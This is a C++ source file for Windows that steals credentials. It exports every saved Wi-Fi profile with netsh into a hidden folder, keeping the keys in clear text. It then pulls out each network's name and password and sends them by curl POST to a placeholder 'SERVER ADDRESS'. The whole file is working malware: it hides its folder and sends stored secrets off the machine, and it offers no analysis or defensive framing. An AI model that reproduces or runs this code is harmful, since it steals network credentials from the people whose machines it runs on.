#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <algorithm>

using namespace std;

int main() {
	system("mkdir wifi");//create wifi folder
	system("C:\\Windows\\System32\\attrib.exe wifi +h");//hide wifi folder
	system("C:\\Windows\\System32\\netsh.exe wlan export profile folder=%cd%\\wifi key=clear");//export wifi profiles into wifi folder
	system("cd wifi && dir /b > profiles.txt");//list profiles into profiles.txt

	ifstream profileFile(".\\wifi\\profiles.txt");

	if (profileFile.fail()) {
		cout << "Error opening file." << endl;
		return 0;
	}

	string line;
	
	while (getline(profileFile, line)) {
		string profile = line.c_str();
		if (profile != "profiles.txt") {
			string baseName = profile.substr(0, profile.length() - 4);
			string renameCommand = "cd wifi && rename \"" + profile + "\" \"" + baseName + ".txt\"";
			system(renameCommand.c_str());

			ifstream profileXML(".\\wifi\\" + baseName + ".txt");
			string xmlLine;
			string profile;
			while (getline(profileXML, xmlLine)) {
				profile = profile + xmlLine;
			}
			int namePosStart = profile.find("<name>");
			int namePosEnd = profile.find("</name>");
			string name = profile.substr(namePosStart, namePosEnd - namePosStart);
			name = name.substr(6, name.length());
			replace(name.begin(), name.end(), ' ', ';');

			int authPosStart = profile.find("<authentication>");
			int authPosEnd = profile.find("</authentication>");
			string auth = profile.substr(authPosStart, authPosEnd - authPosStart);
			auth = auth.substr(16, auth.length());

			if (auth != "open") {
				int passwordPosStart = profile.find("<keyMaterial>");
				int passwordPosEnd = profile.find("</keyMaterial>");
				string password = profile.substr(passwordPosStart, passwordPosEnd - passwordPosStart);
				password = password.substr(13, password.length());
				replace(password.begin(), password.end(), ' ', ';');

				string sendCommand = "C:\\Windows\\System32\\curl.exe -X POST \"SERVER ADDRESS/?name=" + name + "&password=" + password + "\"";
				system(sendCommand.c_str());
				cout << " - sent: " << name << endl;
			}

			profileXML.close();
		}
	}
	profileFile.close();
}
